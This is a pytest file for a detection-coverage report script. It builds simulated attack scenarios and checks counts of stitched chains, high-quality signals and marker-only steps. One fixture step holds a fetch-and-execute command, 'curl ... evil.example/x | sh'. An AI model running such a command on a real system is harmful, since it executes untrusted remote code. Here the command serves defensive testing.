"""signal_quality section of coverage_report: stitched chains, HQS, marker-only steps."""
from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
SCRIPT = REPO_ROOT / "detection_scanner" / "scripts" / "coverage_report.py"
UNIT42 = "https://unit42.paloaltonetworks.com/some-report/"


@pytest.fixture
def module():
    spec = importlib.util.spec_from_file_location("coverage_report", SCRIPT)
    assert spec and spec.loader
    m = importlib.util.module_from_spec(spec)
    sys.modules["coverage_report"] = m
    spec.loader.exec_module(m)
    return m


def _step(sid, command, planes):
    return {
        "id": sid, "name": sid, "command": command,
        "expected_detections": [
            {"plane": p, "type": "BIOC", "description": "d"} for p in planes
        ],
    }


def _scn(sid, steps, **extra):
    base = {"scenario_id": sid, "name": sid, "status": "active", "plane": "ANALYTICS",
            "mitre_tactic": "TA0001", "mitre_tactic_name": "Initial Access",
            "mitre_technique": "T1190", "methodology_family": "F1", "steps": steps}
    base.update(extra)
    return base


def _chain_a():
    return _scn(
        "SIM-A",
        [
            _step("s1", "curl -s http://evil.example/x | sh", ["EDR"]),
            _step("s2", "whoami", ["EDR"]),
            _step("s3", "echo done", ["NDR"]),          # marker-only, carries 1 detection
            _step("s4", "id", ["CDR"]),
        ],
        stitching_key="src_ip",
        required_planes_in_incident=["EDR", "NDR"],
        threat_report_url=UNIT42,
        indicators=[{"type": "domain", "value": "evil.example", "source_url": UNIT42}],
    )


def _chain_b():
    return _scn(
        "SIM-B", [_step("s1", "whoami", ["ANALYTICS"])],
        stitching_key="k",
        required_planes_in_incident=["ANALYTICS", "EMAIL"],
        threat_report_url=UNIT42,
        indicators=[{"type": "domain", "value": "x.example", "source_url": UNIT42}],
    )


def _chain_c():
    return _scn("SIM-C", [_step("s1", "Write-Host 'x'", ["EDR"])])


def test_helpers(module):
    assert module.scenario_legs(_chain_a()) == {"endpoint", "network", "cloud-identity"}
    assert module.scenario_legs(_chain_b()) == set()
    assert module.is_stitched_chain(_chain_a())
    assert not module.is_stitched_chain(_chain_b())
    m = module.is_marker_only_step
    assert m({}) and m({"command": None})
    assert m({"command": "echo hi\n\nprintf x"})
    assert m({"command": "curl -s http://127.0.0.1:8080/x"})
    assert m({"command": "echo a || true"})
    assert not m({"command": "whoami"})
    assert not m({"command": "echo x\nwhoami"})
    assert not m({"command": "echo x; python -m scripts.eal_simulator.cli run"})
    assert not m({"command": "cortexsim-eal run x"})


def test_signal_quality_block(module):
    sq = module.signal_quality([_chain_a(), _chain_b(), _chain_c()])
    assert sq["stitched_chains"] == 1
    assert sq["stitched_chain_ids"] == ["SIM-A"]
    assert sq["hq_signals"] == 3
    assert sq["step_detections"] == 6
    assert sq["hq_share"] == round(3 / 6, 4)
    assert sq["steps"] == 6
    assert sq["marker_only_steps"] == 2
    assert sq["marker_only_share"] == round(2 / 6, 4)
    assert sq["scenarios_with_indicators"] == 2
    assert sq["indicators"] == 2
    assert sq["leg_map"]["EDR"] == "endpoint"
    assert "ANALYTICS" not in sq["leg_map"]


def _corpus(tmp_path):
    sdir = tmp_path / "scenarios"
    sdir.mkdir()
    for s in (_chain_a(), _chain_b(), _chain_c()):
        (sdir / f"{s['scenario_id']}.yml").write_text(yaml.safe_dump(s), encoding="utf-8")
    tdir = tmp_path / "ttps"
    tdir.mkdir()
    return str(sdir), str(tdir)


def test_floors_default_zero_pass(module, tmp_path):
    sdir, tdir = _corpus(tmp_path)
    r = module.compute_report(sdir, tdir, {"strict": True})
    assert r["signal_quality"]["hq_signals"] == 3
    assert not [b for b in r["strict_breaches"] if "floor" in b["kind"] or "ceiling" in b["kind"]]


def test_floor_breach_exits_1(module, tmp_path):
    sdir, tdir = _corpus(tmp_path)
    r = module.compute_report(sdir, tdir, {"strict": True, "hq_signal_floor": 4,
                                           "stitched_chain_floor": 2,
                                           "marker_only_ceiling": 0.1})
    text = [str(b) for b in r["strict_breaches"]]
    assert any("hq_signals 3 < floor 4" in t for t in text)
    assert any("stitched_chains 1 < floor 2" in t for t in text)
    assert any("marker_only_share 0.3333 > ceiling 0.1" in t for t in text)
    assert r["exit_code"] == 1
    warn = module.compute_report(sdir, tdir, {"hq_signal_floor": 4})
    assert warn["exit_code"] == 0


@pytest.mark.parametrize("cmd,expected", [
    ("echo m; dig +short x.example", False),
    (": nothing", True),
    ("echo m && echo n", True),
    ("echo p | bash", False),
    ("echo m; curl -s http://127.0.0.1:8080/ || true", True),
])
def test_marker_only_canonical_vectors(module, cmd, expected):
    assert module.is_marker_only_step({"command": cmd}) is expected


def test_marker_ceiling_compares_before_rounding(module, tmp_path, monkeypatch):
    sdir, tdir = _corpus(tmp_path)
    real = module.signal_quality

    def crafted(scenarios):
        sq = real(scenarios)
        sq.update(marker_only_steps=15004, steps=100000, marker_only_share=0.15)  # 0.15004 -> 0.15
        return sq

    monkeypatch.setattr(module, "signal_quality", crafted)
    r = module.compute_report(sdir, tdir, {"strict": True, "marker_only_ceiling": 0.15})
    assert [b for b in r["strict_breaches"] if b["kind"] == "marker_only_ceiling"]
    assert r["signal_quality"]["marker_only_share"] == 0.15  # JSON keeps the rounded value
